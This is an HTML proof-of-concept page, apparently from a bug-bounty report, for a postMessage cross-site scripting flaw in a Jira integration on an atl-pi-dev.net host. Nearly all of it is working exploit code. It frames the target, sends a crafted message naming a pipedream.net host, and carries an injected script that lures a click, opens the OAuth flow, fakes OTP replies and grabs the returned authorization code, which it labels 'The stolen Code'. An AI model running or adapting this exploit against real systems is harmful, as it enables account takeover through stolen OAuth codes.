<!DOCTYPE html>
<html>
	<head>
		<title>sheets-jira-production PostMessage XSS</title>
	</head>
	<body>
		<p>You want to contact sheets-jira-production! Click this button and submit the form!</p>
		<iframe id="cross_domain_page" src="https://sheets-jira-production.atl-pi-dev.net/jira/auth/init?id=Zgl8jucS7BMp9M6jEf1Zs" style="width:100%;height: 800px;overflow: hidden;" frameBorder="0" allowtransparency="true" scrolling="no"></iframe>
		
		<script>
			const searchParams = new URLSearchParams(window.location.search);
			function sleep (time) {
 		 		return new Promise((resolve) => setTimeout(resolve, time));
			}
			function sendMessage(){
				document.getElementById('cross_domain_page').contentWindow.postMessage({system:"/eo2nbdei2lyckuh.m.pipedream.net/?js=javascript:document.write(\"<body style='width:100%;height: 100%;' id=bb onclick='func();window.addEventListener(\\\"message\\\", (e) => {if(e.data == \\\"get_panel_otp\\\"){win.postMessage({system:\\\"jira\\\",otp:\\\"000000\\\"}, \\\"*\\\");myLoop();} });'><h1 style='font-size:1.5em;word-wrap: break-word;' id=xxx></h1><h1 style='font-size:5em' id=xx>Click Me!</h1></body><script>var win;function sleep (time) {return new Promise((resolve) => setTimeout(resolve, time));}function func(){win=window.open(\\\"https://sheets-jira-production.atl-pi-dev.net/jira/auth/init?id=Zgl8jucS7BMp9M6jEf1Zs%26rand=\\\"%2bMath.floor((Math.random() * Math.pow(10, 11))));};function myLoop() {setTimeout(function() {try {if (win.location.href.indexOf(\\\"code=\\\") !== -1) {url2 = new URL(win.location.href);document.getElementById(\\\"xx\\\").style=\\\"font-size:1.5em;word-wrap: break-word;\\\";document.getElementById(\\\"bb\\\").setAttribute(\\\"onclick\\\", \\\"\\\");document.getElementById(\\\"xxx\\\").innerText=\\\"The stolen Code is\\\";document.getElementById(\\\"xx\\\").innerText=url2.searchParams.get(\\\"code\\\")}else{myLoop();}}catch(err){myLoop();}}, 1000)}<%2fscript>\")//#",otp:"123456"},"*");
				}
			sleep(5000).then(() => {
				sendMessage();
				});

		</script>
	</body>
</html>
